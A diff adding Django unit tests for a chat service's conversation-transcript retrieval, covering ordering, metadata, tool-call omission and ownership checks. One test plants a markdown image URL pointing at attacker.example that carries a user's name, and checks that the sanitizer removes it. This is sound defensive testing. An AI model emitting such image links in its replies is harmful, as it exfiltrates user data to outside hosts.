@@ -3238,3 +3238,81 @@ class ConversationPurgeSignalTests(_ChatServiceFixture, TestCase):
         collector = Collector(using="default")
         self.assertFalse(collector.can_fast_delete(
             Conversation.objects.filter(user=self.seeker)))
+
+
+class GetConversationMessagesTests(_ChatServiceFixture, TestCase):
+    def test_returns_the_transcript_in_order(self):
+        from apps.ai.services import get_conversation_messages
+        saver = self._saver()
+        sent = self._send("first question", responses=[self._reply("first answer")],
+                          checkpointer=saver)
+        self._send("second question", responses=[self._reply("second answer")],
+                   conversation_id=sent["conversation_id"], checkpointer=saver)
+        out = get_conversation_messages(
+            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
+        self.assertEqual(
+            [(m["role"], m["content"]) for m in out["messages"]],
+            [("user", "first question"), ("assistant", "first answer"),
+             ("user", "second question"), ("assistant", "second answer")])
+
+    def test_includes_the_conversation_metadata(self):
+        from apps.ai.services import get_conversation_messages
+        saver = self._saver()
+        sent = self._send("hello there", responses=[self._reply("hi")],
+                          checkpointer=saver)
+        out = get_conversation_messages(
+            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
+        self.assertEqual(out["id"], sent["conversation_id"])
+        self.assertEqual(out["title"], "hello there")
+        self.assertIn("created_at", out)
+
+    def test_omits_tool_calls_and_tool_results(self):
+        """A transcript is what the participants said, not the machinery."""
+        from apps.ai.services import get_conversation_messages
+        saver = self._saver()
+        sent = self._send("any python roles?", responses=[
+            self._toolcall("search_jobs", {"keywords": "python"}),
+            self._reply("Yes, one.")], checkpointer=saver)
+        out = get_conversation_messages(
+            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
+        self.assertEqual([m["role"] for m in out["messages"]], ["user", "assistant"])
+        self.assertEqual(out["messages"][1]["content"], "Yes, one.")
+
+    def test_sanitizes_stored_assistant_text(self):
+        from apps.ai.services import get_conversation_messages
+        saver = self._saver()
+        sent = self._send("hi", responses=[self._reply(
+            "See ![](https://attacker.example/p?d=Ada)")], checkpointer=saver)
+        out = get_conversation_messages(
+            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
+        self.assertNotIn("attacker.example", out["messages"][1]["content"])
+
+    def test_another_users_conversation_is_not_found(self):
+        from apps.ai.exceptions import ConversationNotFoundError
+        from apps.ai.models import Conversation
+        from apps.ai.services import get_conversation_messages
+        intruder = UserAccount.objects.create_user(
+            email="nosy3@example.com", password="Str0ng-Password!",
+            user_type="job_seeker")
+        mine = Conversation.objects.create(user=self.seeker, title="private")
+        with self.assertRaises(ConversationNotFoundError):
+            get_conversation_messages(intruder, conversation_id=str(mine.id),
+                                      checkpointer=self._saver())
+
+    def test_unknown_and_malformed_ids_raise_not_found(self):
+        from apps.ai.exceptions import ConversationNotFoundError
+        from apps.ai.services import get_conversation_messages
+        for bad in ("00000000-0000-0000-0000-000000000000", "nope"):
+            with self.subTest(conversation_id=bad):
+                with self.assertRaises(ConversationNotFoundError):
+                    get_conversation_messages(self.seeker, conversation_id=bad,
+                                              checkpointer=self._saver())
+
+    def test_conversation_with_no_turns_returns_an_empty_list(self):
+        from apps.ai.models import Conversation
+        from apps.ai.services import get_conversation_messages
+        conversation = Conversation.objects.create(user=self.seeker, title="empty")
+        out = get_conversation_messages(
+            self.seeker, conversation_id=str(conversation.id),
+            checkpointer=self._saver())
+        self.assertEqual(out["messages"], [])
